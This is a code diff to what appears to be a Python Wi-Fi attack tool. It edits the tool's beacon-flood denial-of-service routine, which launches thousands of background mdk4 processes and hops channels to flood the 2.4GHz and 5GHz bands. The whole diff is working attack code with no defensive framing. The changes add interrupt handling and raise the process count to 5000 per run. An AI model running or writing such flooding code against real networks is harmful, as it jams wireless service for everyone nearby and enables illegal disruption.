@@ -5,8 +5,11 @@ from scapy.all import Dot11, Dot11Deauth, Dot11Disas, RadioTap, Dot11Elt, sendp,
 
 def main():
 	Set_Monitor()
-	while True:
-		Prompt_User()
+	try:
+		while True:
+			Prompt_User()
+	except KeyboardInterrupt:
+		Exit_Script()
 
 def Prompt_User():
 	opt = 99
@@ -46,49 +49,39 @@ def Beacon_Prompt():
 	100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140,	# UNII-2 Extended
 	149, 153, 157, 161, 165]				# UNII-3 (High Band)
 	bfType = input("""
-a.   Full 5GHz band
 bg.  Full 2.4GHz band
-abg. Full band attack of both 2.4GHz and 5GHz
+a.   Full 5GHz band
 #.   Attack specificed channel (if 2.4GHz or 5GHz channel)
 q.   Quit
 Enter selected target for beacon flood DoS attack: """)
 	if bfType.casefold() == "bg".casefold():
 		print("Started attack on 2.4GHz band")
-		for chanIndex in range(1980):
-			subprocess.run(f"mdk4 wlan0 b -h > /dev/null &", shell=True, executable="/bin/bash")
-			#subprocess.run(f"mdk4 wlan0 b -c {channel_list[chanIndex%11]} > /dev/null &", shell=True, executable="/bin/bash")
-		exit = input('Input anything to end attack: ')
-		subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
-		print("Ended attack on 2.4GHz band")
-		return False
-	if bfType.casefold() == "a".casefold():
-		print("Started attack on 5GHz band")
-		for chanIndex in range(2000):
-			#subprocess.run(f"mdk4 wlan0 b -h > /dev/null &", shell=True, executable="/bin/bash")
-			subprocess.run(f"mdk4 wlan0 b -c {channel_list[11+chanIndex%25]} > /dev/null &", shell=True, executable="/bin/bash")
-		exit = input('Input anything to end attack: ')
-		subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
-		print("Ended attack on 5GHz band")
-		return False
-	if bfType.casefold() == "abg".casefold():
-		print("Started attack on both 2.4GHz and 5GHz bands")
-		for chanIndex in range(2160):
-			#subprocess.run(f"mdk4 wlan0 b -h > /dev/null &", shell=True, executable="/bin/bash")
-			subprocess.run(f"mdk4 wlan0 b -c {channel_list[chanIndex%36]} > /dev/null &", shell=True, executable="/bin/bash")
-		exit = input('Input anything to end attack: ')
-		subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
-		print("Ended attack on 2.4GHZ and 5GHz bands")
-		return False
-	if bfType.casefold() == "t".casefold():
-		print("Testing BF DoS")
 		index = 0
 		Set_Channel(channel_list[index])
-		for i in range(2000):
+		for i in range(5000):
 			subprocess.run("mdk4 wlan0 b > /dev/null &", shell=True, executable="/bin/bash")
-		while True:
-			time.sleep(0.05)
-			index += 1
-			Set_Channel(channel_list[index%11])
+		try:
+			while True:
+				time.sleep(0.02)
+				index += 1
+				Set_Channel(channel_list[index%11])
+		except KeyboardInterrupt:
+			print("Ended attack on 2.4GHz band")
+			Exit_Script()
+	if bfType.casefold() == "a".casefold():
+		print("Started attack on 5GHz band")
+		index = 11
+		Set_Channel(channel_list[index])
+		for i in range(5000):
+			subprocess.run("mdk4 wlan0 b > /dev/null &", shell=True, executable="/bin/bash")
+		try:
+			while True:
+				time.sleep(0.02)
+				index += 1
+				Set_Channel(channel_list[index%25+11])
+		except KeyboardInterrupt:
+			print("Ended attack on 5GHz band")
+			Exit_Script()
 	if bfType.casefold() == "q".casefold():
 		return False
 	try:
@@ -96,7 +89,7 @@ Enter selected target for beacon flood DoS attack: """)
 		if channel in channel_list:
 			print(f"Started attack on channel {channel}")
 			Set_Channel(channel)
-			for i in range(2000):
+			for i in range(5000):
 				subprocess.run(f"mdk4 wlan0 b -c {channel} > /dev/null &", shell=True, executable="/bin/bash")
 			exit = input('Input anything to end attack: ')
 			subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
